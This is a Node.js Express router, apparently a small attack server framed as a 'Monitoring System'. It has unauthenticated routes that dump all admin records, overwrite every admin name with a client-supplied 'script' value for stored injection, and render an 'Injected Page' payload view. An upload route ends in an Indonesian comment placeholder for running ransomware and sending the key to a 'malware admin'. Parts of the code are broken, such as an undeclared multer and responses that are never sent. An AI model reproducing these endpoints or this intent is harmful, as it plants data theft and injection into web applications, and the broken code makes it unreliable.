var express = require('express');
var router = express.Router();
var Upload = require('../middleware/UploadMiddleware')
// var jwt_decode = require('jwt-decode')
/* Models Include */
var { AdminData } = require('../models/AdminModels');
/* End Models Include */

/* GET home page. */
router.get('/', (req, res) => {
  res.render('index', { title: "Monitoring System RMS" });
});

/* Payload Inject */
router.get('/payload', (req, res) => {
  res.render('payload', {
    title: "Injected Page"
  });
})
/* End Payload Inject */

/* Inject Data Admin  */
router.get('/send-data-admin', async (req, res) => {
  await AdminData.find({})
    .then(results => {
      res.status(200).json(results);
    })
    .catch(err => {
      res.status(400).send({ message: `Error Data :  ${err}` });
    })
})
/* End Inject Data admin  */

/* Inject Data admin_name */
router.post('/insert-data-admin-name', async (req, res) => {
  const { script } = req.body;
  if (script) {
    const InsertPacket = AdminData.updateMany({}, {
      admin_name: script
    })
    if (InsertPacket) {
      res.status(200)
    } else {
      res.status(400);
    }
  }
})
/* End Inject Data admin_name */

/* Send Packet */
let PacketModule = Upload.fields([{ name: 'file_man_in_the_middle' }])
router.post('/insert-packet', async (req, res) => {
  PacketModule(req, res, (err) => {
    if (req.fileValidationError) {
      return res.status(400).send({ message: `${req.fileValidationError}` });
    }
    if (err instanceof multer.MulterError) {
      return res.status(501).send(err.code);
    }
    if (err) {
      return res.status(502).send({ message: err });
    }
    if (!req.files) {
      return res.status(404).send({ message: 'Harap Uplaod Gambar Dahulu' });
    }
    if (req.files && !err && !req.fileValidationError) {
      const { filename } = req.files.file_man_in_the_middle[0]
      const AddManMiddle = new AdminData({
        admin_image: filename
      })
      const Traped = AddManMiddle.save()
      if (Traped) {
        /* --------- JALANKAN RANSOMEWARE DAN KIRIMKAN KEY KE MALWARE ADMIN --------- */
      }
    }
  })
})
/* End Send Packet */

// router.get('/token-test', async (req, res) => {
//   let token = req.cookies.admin_token
//   if (!token) {
//     let payload = jwt_decode(token)
//     console.log(payload)
//   } else {
//     console.log('token Tidak di temukan')
//   }
// })


module.exports = router;
